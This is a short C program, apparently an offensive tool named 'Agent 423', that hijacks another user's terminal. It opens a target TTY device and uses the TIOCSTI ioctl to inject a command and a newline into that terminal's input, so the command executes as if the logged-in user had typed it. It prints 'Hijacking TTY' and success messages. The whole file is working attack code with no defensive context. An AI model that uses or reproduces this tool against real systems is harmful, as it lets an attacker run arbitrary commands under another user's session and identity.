#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>

/* Agent 423: TTY Input Injection.
   Uses TIOCSTI to push characters into a target TTY buffer.
   This makes commands appear as if typed by the logged-in user.
*/

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <dev_path> <command>\n", argv[0]);
        printf("Example: %s /dev/pts/1 'whoami'\n", argv[0]);
        return 1;
    }

    char *dev = argv[1];
    char *cmd = argv[2];

    // 1. Open the target terminal
    int fd = open(dev, O_RDWR);
    if (fd < 0) {
        perror("open tty");
        return 1;
    }

    printf("[*] Hijacking TTY: %s\n", dev);

    // 2. Inject each character of the command
    for (int i = 0; i < strlen(cmd); i++) {
        if (ioctl(fd, TIOCSTI, &cmd[i]) < 0) {
            perror("ioctl TIOCSTI");
            close(fd);
            return 1;
        }
    }

    // 3. Inject a Newline to execute
    char nl = '\n';
    ioctl(fd, TIOCSTI, &nl);

    printf("[\033[92mSUCCESS\033[0m] Command injected into %s\n", dev);

    close(fd);
    return 0;
}
